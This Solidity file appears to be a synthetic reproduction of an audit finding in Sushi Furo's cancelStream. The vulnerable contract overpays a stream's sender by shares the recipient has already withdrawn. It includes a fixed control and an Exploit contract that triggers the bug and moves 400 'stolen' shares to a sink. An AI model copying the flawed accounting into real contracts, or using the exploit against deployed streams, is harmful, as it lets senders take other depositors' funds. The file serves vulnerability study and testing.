// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sushi Furo — cancelStream pays the sender the shares already withdrawn
    (Sigma Prime, finding 19584).
    SYNTHETIC, cheatcode-free. senderBalance = deposited - recipientBalance,
    and recipientBalance has already subtracted withdrawnShares (@> VULN).
    A 1000-share stream is halfway done (500 streamed) and 400 were withdrawn.
    The sender is paid 900 instead of 500. The extra 400 is another depositor's
    balance. The control subtracts the streamed amount, not the net balance. */

contract MockToken {
    string public name = "SHARE";
    string public symbol = "SHARE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Sink {}

contract FuroStream {
    struct Stream {
        uint256 depositedShares;
        uint256 withdrawnShares;
        uint256 startTime;
        uint256 endTime;
        address sender;
        address recipient;
    }

    MockToken public token;
    Stream public stream;
    uint256 public senderBalancePaid;
    uint256 public recipientBalancePaid;

    constructor(address _token) {
        token = MockToken(_token);
    }

    function open(
        address sender,
        address recipient,
        uint256 deposited,
        uint256 withdrawn,
        uint256 startTime,
        uint256 endTime
    ) external {
        stream = Stream(deposited, withdrawn, startTime, endTime, sender, recipient);
    }

    function cancelStream() external {
        Stream memory s = stream;
        uint256 timeDelta = block.timestamp - s.startTime;
        uint256 recipientBalance =
            ((s.depositedShares * timeDelta) / (s.endTime - s.startTime)) - uint256(s.withdrawnShares);
        // @> VULN: recipientBalance already subtracted withdrawnShares, so the sender is paid those shares again
        uint256 senderBalance = uint256(s.depositedShares) - recipientBalance;
        token.transfer(s.sender, senderBalance);
        token.transfer(s.recipient, recipientBalance);
        senderBalancePaid = senderBalance;
        recipientBalancePaid = recipientBalance;
    }
}

contract FuroStreamFixed {
    struct Stream {
        uint256 depositedShares;
        uint256 withdrawnShares;
        uint256 startTime;
        uint256 endTime;
        address sender;
        address recipient;
    }

    MockToken public token;
    Stream public stream;
    uint256 public senderBalancePaid;

    constructor(address _token) {
        token = MockToken(_token);
    }

    function open(
        address sender,
        address recipient,
        uint256 deposited,
        uint256 withdrawn,
        uint256 startTime,
        uint256 endTime
    ) external {
        stream = Stream(deposited, withdrawn, startTime, endTime, sender, recipient);
    }

    function cancelStream() external {
        Stream memory s = stream;
        uint256 timeDelta = block.timestamp - s.startTime;
        uint256 streamed = (s.depositedShares * timeDelta) / (s.endTime - s.startTime);
        uint256 recipientBalance = streamed - uint256(s.withdrawnShares);
        // FIX: sender keeps only the shares that have not streamed
        uint256 senderBalance = uint256(s.depositedShares) - streamed;
        token.transfer(s.sender, senderBalance);
        token.transfer(s.recipient, recipientBalance);
        senderBalancePaid = senderBalance;
    }
}

contract Exploit {
    MockToken public token;
    FuroStream public furo;
    Sink public sink;
    address public recipient;
    uint256 public constant DEPOSITED = 1_000 ether;
    uint256 public constant WITHDRAWN = 400 ether;
    uint256 public constant FAIR_SENDER = 500 ether;
    uint256 public constant STOLEN = 400 ether;
    uint256 public otherShares = 400 ether;

    constructor() {
        token = new MockToken();
        furo = new FuroStream(address(token));
        sink = new Sink();
        recipient = address(new Receiver());
    }

    function run() external {
        uint256 endTime = block.timestamp * 2;
        furo.open(address(this), recipient, DEPOSITED, WITHDRAWN, 0, endTime);
        token.mint(address(furo), DEPOSITED);
        furo.cancelStream();
        uint256 got = token.balanceOf(address(this));
        require(got == 900 ether, "sender paid 900");
        require(got - FAIR_SENDER == STOLEN, "overpaid by 400");
        require(furo.recipientBalancePaid() == 100 ether, "recipient net");
        require(token.balanceOf(address(furo)) == 0, "pot empty");
        require(otherShares == STOLEN, "other depositor book");
        token.transfer(address(sink), STOLEN);
        require(token.balanceOf(address(sink)) == STOLEN, "stolen");
    }
}

contract Receiver {}
